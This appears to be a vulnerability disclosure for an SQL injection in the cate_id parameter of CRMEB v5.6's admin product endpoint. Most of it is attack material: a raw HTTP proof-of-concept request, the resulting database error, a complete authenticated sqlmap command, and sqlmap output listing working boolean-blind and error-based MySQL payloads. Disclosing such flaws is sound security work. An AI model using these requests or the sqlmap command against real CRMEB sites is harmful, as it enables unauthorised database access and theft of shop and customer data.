# CRMEB-V5.6-SQL-Injection
/adminapi/product/product interface GET cate_id parameters for SQL injection

Source code address：https://github.com/crmeb/CRMEB

Install the pagoda according to the official tutorial

Official install link: https://doc.crmeb.com/single_open/open_v54/19892

Log in with your account and password

Use the following poc; An exception was issued upon discovering an error in the database
--------------------------------------------------------------------------------------------------------------------------------------------
GET /adminapi/product/product?cate_id=%E9%8E%88%27%22%5C%28&is_gift=&limit=15&logistics=&page=1&price_s%5B%5D=&price_s%5B%5D=&sales_s%5B%5D=&sales_s%5B%5D=&spec_type=&stock_s%5B%5D=&stock_s%5B%5D=&store_name=&time=&type=1&vip_product=&virtual_type= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Authori-Zation: Bearer eyJ0xxxxxx
Referer: 
Accept-Encoding: gzip


--------------------------------------------------------------------------------------------------------------------------------------------
Response result：
--------------------------------------------------------------------------------------------------------------------------------------------
{"status":400,"msg":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\"\\() OR `cate_pid` IN (1,2,3,4,5,6,7,8,鎈'\"\\())  AND `is_show` = ?  AND `is_de' at line 1","data":[]}
--------------------------------------------------------------------------------------------------------------------------------------------
Run directly using sqlmap：


--------------------------------------------------------------------------------------------------------------------------------------------
sqlmap -u "http://xxxxx/adminapi/product/product?  cate_id=1&is_gift=&limit=15&logistics=&page=1&price_s%5B%5D=&price_s%5B%5D=&sales_s%5B%5D=&sales_s%5B%5D=&spec_type=&stock_s%5B%5D=&stock_s%5B%5D=&store_name=&time=&type=1&vip_product=&virtual_type=" -p cate_id --headers="Authori-Zation: Bearer eyJ0xxxx\nCookie: PHPSESSID=xxxx;   cb_lang=zh-cn" --batch --level=3 --risk=2 --threads=2 --timeout=10 --random-agent --dbms=mysql


--------------------------------------------------------------------------------------------------------------------------------------------
Result：

--------------------------------------------------------------------------------------------------------------------------------------------
GET parameter 'cate_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 649 HTTP(s) requests:
---
Parameter: cate_id (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: cate_id=1 RLIKE (SELECT (CASE WHEN (1039=1039) THEN 1 ELSE 0x28 END))&is_gift=&limit=15&logistics=&page=1&price_s[]=&price_s[]=&sales_s[]=&sales_s[]=&spec_type=&stock_s[]=&stock_s[]=&store_name=&time=&type=1&vip_product=&virtual_type=

    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: cate_id=GTID_SUBSET(CONCAT(0x7170787671,(SELECT (ELT(5044=5044,1))),0x716a7a7071),5044)&is_gift=&limit=15&logistics=&page=1&price_s[]=&price_s[]=&sales_s[]=&sales_s[]=&spec_type=&stock_s[]=&stock_s[]=&store_name=&time=&type=1&vip_product=&virtual_type=
---
[09:19:14] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.6
[09:19:16] [INFO] fetched data logged to text files under '/Users/xxxx/.local/share/sqlmap/output/xxxxxxx'

--------------------------------------------------------------------------------------------------------------------------------------------










